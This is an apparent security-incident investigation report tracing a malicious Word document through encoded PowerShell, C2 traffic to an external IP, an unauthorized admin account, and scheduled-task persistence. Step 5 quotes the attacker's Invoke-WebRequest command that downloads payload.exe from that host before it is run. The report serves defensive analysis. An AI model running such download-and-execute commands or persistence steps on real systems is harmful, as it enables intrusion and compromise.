# Investigation

## Step 1 — Initial Triage

The alert chain showed:
- Encoded PowerShell execution
- Outbound connection
- Privileged account creation

This sequence suggested a potential multi-stage attack.

---

## Step 2 — Process Analysis (EDR)

Process tree revealed: winword.exe → powershell.exe -enc ...


Observation:
- PowerShell was launched from Microsoft Word
- Indicates possible malicious document or macro execution

---

## Step 3 — Network Analysis

- Outbound connection to `45.77.112.9`
- Port: 443 (HTTPS)
- Reputation: Flagged as potential C2 infrastructure

Conclusion:
- Likely external command & control communication

---

## Step 4 — Authentication & Privilege Events

Windows Security Logs:

- Event ID 4720 → New user created (`backup_admin`)
- Event ID 4728 → Added to Administrators group

Observation:
- Unauthorized privilege escalation

---

## Step 5 — Post-Compromise Activity

- `backup_admin` login confirmed
- PowerShell used to download payload:

Invoke-WebRequest -Uri http://45.77.112.9/payload.exe
 -OutFile C:\Users\Public\payload.exe

- `payload.exe` executed
- Scheduled task created for persistence:
- Name: WindowsUpdateCheck
- Frequency: Every 10 minutes

---

## Step 6 — Assessment

Indicators confirm:

- Malicious document execution
- Command & Control communication
- Privilege escalation
- Persistence mechanism established

##- Confirmed endpoint compromise